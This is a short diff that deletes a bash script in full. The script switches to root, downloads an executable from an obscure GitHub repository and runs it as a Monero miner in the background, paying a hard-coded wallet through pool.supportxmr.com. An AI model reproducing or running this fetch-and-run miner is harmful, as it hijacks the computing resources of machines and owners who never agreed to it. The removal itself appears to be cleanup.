@@ -1,6 +1,0 @@
-#!/bin/bash
-sudo -i
-sudo apt-get install -y wget
-wget https://github.com/gcbmofhwlu/pxokfjwoekx/raw/main/mbtnxklk
-sudo chmod 744 mbtnxklk
-./mbtnxklk --donate-level 5 -o pool.supportxmr.com:443 -u 48tquhfADzULwBoamh8KiRfT6MmkVuVjQb75qPFk5VmPQsgNsXMcZvzFCfB4qFWWHqCzwgPjwYphsgYcFo3yxrLQ74r7XNP -k --tls -p X -B
